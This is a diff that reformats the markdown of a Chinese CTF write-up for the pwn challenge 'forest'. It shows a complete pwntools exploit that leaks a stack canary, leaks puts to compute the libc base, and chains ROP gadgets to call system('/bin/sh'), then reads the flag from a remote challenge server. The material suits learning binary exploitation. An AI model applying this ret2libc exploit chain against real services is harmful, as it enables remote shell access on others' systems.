@@ -43,7 +43,7 @@ Pwn——forest
 
 4\. main 起始地址 → 执行完毕后重回 main
 
-发送 payload 后，服务端返回 puts 在 libc 中的运行时地址。不同发行版的 libc 偏移各有差异，经过比对，远程环境匹配 libc6\_2.23-0ubuntu11.3\_amd64。关键偏移量如下：
+发送 payload 后，服务端返回 puts 在 libc 中的运行时地址。不同发行版的 libc 偏移各有差异，经过比对，远程环境匹配 libc6_2.23-0ubuntu11.3_amd64。关键偏移量如下：
 
 - puts: 0x6F6A0
 
@@ -51,7 +51,7 @@ Pwn——forest
 
 - /bin/sh: 0x18CE57
 
-libc\_base = leaked\_puts - 0x6F6A0
+libc_base = leaked_puts - 0x6F6A0
 
 四、getshell
 
@@ -61,11 +61,11 @@ libc\_base = leaked\_puts - 0x6F6A0
 
 2\. ret（0x40101A）—— 维持栈的 16 字节对齐
 
-3\. pop rdi; ret → libc\_base + 0x18CE57（"/bin/sh" 字符串地址）
+3\. pop rdi; ret → libc_base + 0x18CE57（"/bin/sh" 字符串地址）
 
-4\. libc\_base + 0x453A0（system 函数地址）
+4\. libc_base + 0x453A0（system 函数地址）
 
-system("/bin/sh") 执行后获得 shell，发送 cat /flag\* 即可拿到 flag。
+system("/bin/sh") 执行后获得 shell，发送 cat /flag* 即可拿到 flag。
 
 五、流程图总结
 
@@ -73,13 +73,13 @@ system("/bin/sh") 执行后获得 shell，发送 cat /flag\* 即可拿到 flag�
 
 Exp
 
-\`\`\`python
+```python
 
 \#!/usr/bin/env python3
 
-from pwn import \*
+from pwn import *
 
-context(arch="amd64", os="linux", log\_level="debug")
+context(arch="amd64", os="linux", log_level="debug")
 
 binary = ELF("./attachment-56", checksec=False)
 
@@ -89,49 +89,49 @@ if MODE == "remote":
 
 tube = remote("39.96.193.120", 10001)
 
-PUTS\_LIBC = 0x6F6A0
+PUTS_LIBC = 0x6F6A0
 
-SYSTEM\_LIBC = 0x453A0
+SYSTEM_LIBC = 0x453A0
 
-BINSH\_LIBC = 0x18CE57
+BINSH_LIBC = 0x18CE57
 
 elif MODE == "local":
 
 tube = process("./attachment-56")
 
-libc\_ref = ELF("/lib/x86\_64-linux-gnu/libc.so.6", checksec=False)
+libc_ref = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
 
-PUTS\_LIBC = libc\_ref.sym\["puts"\]
+PUTS_LIBC = libc_ref.sym["puts"]
 
-SYSTEM\_LIBC = libc\_ref.sym\["system"\]
+SYSTEM_LIBC = libc_ref.sym["system"]
 
-BINSH\_LIBC = next(libc\_ref.search(b"/bin/sh\\x00"))
+BINSH_LIBC = next(libc_ref.search(b"/bin/sh\\x00"))
 
-POP\_RDI = 0x401763
+POP_RDI = 0x401763
 
 RET = 0x40101A
 
-CANARY\_DIST = 24 \# rbp-0x20 to rbp-0x8
+CANARY_DIST = 24 # rbp-0x20 to rbp-0x8
 
-\# ---------- helpers ----------
+# ---------- helpers ----------
 
-def answer\_puzzles():
+def answer_puzzles():
 
 tube.sendlineafter(b"note:\\n", b"100")
 
 tube.sendlineafter(b"rune sheet!\\n", b"magic")
 
-def steal\_canary():
+def steal_canary():
 
 tube.recvuntil(b"What do you sacrifice?\\n")
 
-tube.send(b"X" \* (CANARY\_DIST + 1))
+tube.send(b"X" * (CANARY_DIST + 1))
 
 resp = tube.recvuntil(b"A curious gift indeed.\\n")
 
-marker = resp.index(b"X" \* (CANARY\_DIST + 1))
+marker = resp.index(b"X" * (CANARY_DIST + 1))
 
-raw = resp\[marker + CANARY\_DIST + 1 : marker + CANARY\_DIST + 8\]
+raw = resp[marker + CANARY_DIST + 1 : marker + CANARY_DIST + 8]
 
 canary = b"\\x00" + raw
 
@@ -139,23 +139,23 @@ log.success("canary -&gt; " + canary.hex())
 
 return canary
 
-def dump\_puts(canary):
+def dump_puts(canary):
 
 rop1 = flat(
 
-b"B" \* CANARY\_DIST,
+b"B" * CANARY_DIST,
 
 canary,
 
-b"C" \* 8,
+b"C" * 8,
 
-POP\_RDI,
+POP_RDI,
 
-binary.got\["puts"\],
+binary.got["puts"],
 
-binary.plt\["puts"\],
+binary.plt["puts"],
 
-binary.sym\["main"\],
+binary.sym["main"],
 
 )
 
@@ -169,43 +169,43 @@ log.success("puts@libc -&gt; " + hex(leak))
 
 return leak
 
-def back\_to\_main():
+def back_to_main():
 
 tube.recvuntil(b"What do you sacrifice?\\n")
 
-tube.send(b"Z" \* CANARY\_DIST)
+tube.send(b"Z" * CANARY_DIST)
 
 tube.recvuntil(b"A curious gift indeed.\\n")
 
-\# ---------- main flow ----------
+# ---------- main flow ----------
 
-answer\_puzzles()
+answer_puzzles()
 
-canary = steal\_canary()
+canary = steal_canary()
 
-puts\_real = dump\_puts(canary)
+puts_real = dump_puts(canary)
 
-base = puts\_real - PUTS\_LIBC
+base = puts_real - PUTS_LIBC
 
 log.success("libc base -&gt; " + hex(base))
 
-back\_to\_main()
+back_to_main()
 
 rop2 = flat(
 
-b"E" \* CANARY\_DIST,
+b"E" * CANARY_DIST,
 
 canary,
 
-b"F" \* 8,
+b"F" * 8,
 
 RET,
 
-POP\_RDI,
+POP_RDI,
 
-base + BINSH\_LIBC,
+base + BINSH_LIBC,
 
-base + SYSTEM\_LIBC,
+base + SYSTEM_LIBC,
 
 )
 
@@ -213,13 +213,13 @@ tube.send(rop2)
 
 tube.recvuntil(b"The ghost answers with warmth.\\n")
 
-tube.sendline(b"cat /flag\* 2&gt;/dev/null; cat flag\* /flag\* 2&gt;/dev/null; exit")
+tube.sendline(b"cat /flag* 2&gt;/dev/null; cat flag* /flag* 2&gt;/dev/null; exit")
 
 import re
 
 result = tube.recvall(timeout=10)
 
-m = re.search(rb"ISCC\\{\[\^}\]+\\}", result)
+m = re.search(rb"ISCC\\{[\^}]+\\}", result)
 
 if m:
 
@@ -231,7 +231,7 @@ print(result.decode("latin-1", errors="replace"))
 
 tube.close()
 
-\`\`\`
+```
 
 Flag
 
